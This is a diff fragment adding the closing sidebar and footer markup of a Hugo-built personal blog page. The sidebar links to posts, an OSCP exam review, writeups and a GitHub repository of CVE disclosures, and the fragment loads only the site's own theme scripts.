+            <li class="" data-nav-id="/posts/index.html"><a class="padding default-animation" href="/posts/index.html">Posts</a><ul id="R-subsections-b4e55eb7e39db1aee6d02808a2267090" class="collapsible-menu"></ul></li>
+            <li class="parent " data-nav-id="/private/index.html"><a class="padding default-animation" href="/private/index.html">Private</a><ul id="R-subsections-770b76f7b7b90b1c020ff5111c7b62af" class="collapsible-menu">
+            <li class="active " data-nav-id="/private/oscp/index.html"><a class="padding" href="/private/oscp/index.html">OSCP 시험 후기</a></li></ul></li>
+            <li class="" data-nav-id="/writeup/index.html"><a class="padding default-animation" href="/writeup/index.html">Writeup</a><ul id="R-subsections-4c552b9ca9f2e0503cd4c0d79a1b1839" class="collapsible-menu"></ul></li>
+          </ul>
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-shortcuts default-animation">
+          <div class="nav-title padding">More</div>
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="https://github.com/eoniboogie/CVE_Disclosures"><a class="padding" href="https://github.com/eoniboogie/CVE_Disclosures" rel="external"><i class="fab fa-github"></i> CVE Disclosures</a></li>
+          </ul>
+        </div>
+        <div id="R-footer-margin" class="default-animation"></div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-footercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+<div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
+      </div>
+    </aside>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1773151229" defer></script>
+    <script src="/js/theme.js?1773151229" defer></script>
+    <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
+  </body>
+</html>
